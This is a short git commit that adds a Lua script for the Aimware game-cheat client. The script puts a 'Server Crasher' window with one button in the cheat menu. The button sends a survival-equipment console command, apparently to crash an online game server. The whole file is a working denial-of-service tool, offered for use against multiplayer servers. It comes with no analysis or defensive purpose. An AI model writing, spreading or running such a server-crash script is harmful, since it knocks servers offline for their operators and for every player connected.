3cd7951780f245b3417500af034c894048f91634
LynxKik <princerabbz@gmail.com>
2019-09-02 09:45:41 +0600

    Intiail Release

---
+++ [LuaScript] Crash Server.lua
@@ -0,0 +1,12 @@
+local references = {
+    aimware = gui.Reference("MENU"),
+};
+local windowW, windowH = 200, 100;
+local window = gui.Window("lynx_server_crasher" .. "tabs", "Server Crasher", 100, 150, windowW, windowH);
+gui.Button( window, "Crash server", function()
+    client.Command("survival_equip spawn_equip_healthshot")
+end)
+
+callbacks.Register("Draw", function()
+    window:SetActive(references.aimware:IsActive());
+end);
